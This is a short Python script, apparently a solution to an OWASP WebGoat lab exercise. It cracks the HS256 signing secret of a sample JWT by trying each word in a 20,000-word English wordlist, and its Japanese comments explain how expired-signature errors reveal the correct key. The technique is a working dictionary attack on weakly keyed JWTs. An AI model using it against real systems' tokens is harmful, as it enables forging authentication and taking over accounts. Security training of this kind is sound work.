import jwt

# 提示されたTOKENをここに
token = 'eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTY3ODgwMTMyOSwiZXhwIjoxNjc4ODAxMzg5LCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.F10XcOBnE3pq9BNpljTLhiEg_6MVSXAaM4VRtwSKTuU'

# https://github.com/first20hours/google-10000-english/blob/master/20k.txt
# 20k.txtは以上のリポジトリからお借りしました。
try :
    f = open('20k.txt','r')
    for key in f:
        try:
            decoded = jwt.decode(
                token,
                key.rstrip('\n'),
                algorithms=["HS256"]
            )
            print(key)
            #メタ文字までVerificationに使用するっぽい...rstripで20k.txtからkeyに読み込ませた行の文字列の右端の終端文字を削除することで正しく認証させられる
        except Exception as e:
            if 'Signature has expired' in str(e):
                print('result is '+key)
                break
            #keyが通った場合はverification failedではなくSignature has expired(署名時間切れ)のExceptを吐き出すのでそれをキャッチして文字列検証で分別する
            # !'verification failed' in str(e)のほうが確実...?
except :
    print('Something went wrong')